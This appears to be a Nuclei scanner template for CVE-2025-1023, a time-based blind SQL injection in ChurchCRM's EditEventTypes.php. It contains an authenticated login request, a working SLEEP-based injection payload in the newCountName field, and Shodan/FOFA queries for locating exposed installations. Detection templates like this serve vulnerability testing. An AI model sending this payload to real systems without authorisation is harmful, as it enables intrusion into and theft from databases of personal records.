id: CVE-2025-1023

info:
  name: ChurchCRM - SQL Injection
  author: Kazgangap
  severity: critical
  description: |
    A vulnerability exists in ChurchCRM 5.13.0 and prior that allows an attacker to execute arbitrary SQL queries by exploiting a time-based blind SQL Injection vulnerability in the EditEventTypes functionality. The newCountName parameter is directly concatenated into an SQL query without proper sanitization, allowing an attacker to manipulate database queries and execute arbitrary commands, potentially leading to data exfiltration, modification, or deletion.
  reference:
    - https://github.com/ChurchCRM/CRM/issues/7246
    - https://github.com/Kazgangap/cve-poc-garage/blob/main/2025/CVE-2025-1023.md
    - https://nvd.nist.gov/vuln/detail/CVE-2025-1023
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-1023
    cwe-id: CWE-89
    epss-score: 0.00121
    epss-percentile: 0.32251
    cpe: cpe:2.3:a:churchcrm:churchcrm:*:*:*:*:*:*:*:*
  metadata:
    vendor: churchcrm
    product: churchcrm
    shodan-query: http.title:"churchcrm"
    fofa-query: app="churchcrm"
  tags: cve,cve2025,authenticated,sqli,time-based,kev

http:
  - raw:
      - |
        POST /session/begin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        User={{username}}&Password={{password}}

      - |
        @timeout 20s
        POST /EditEventTypes.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        EN_tyid=1&newEvtName=Test&newEvtStartTime=10:30:00&newCountName=1%27%20AND%20(SELECT%20SLEEP(6))%20AND%20%271%27%3D%271&Action=ADD

    matchers:
      - type: dsl
        dsl:
          - 'duration >= 6'
          - 'status_code_2 == 500'
          - 'contains(content_type_2, "text/html")'
          - 'contains(body_2, "<title>ChurchCRM: Edit Event Types")'
        condition: and
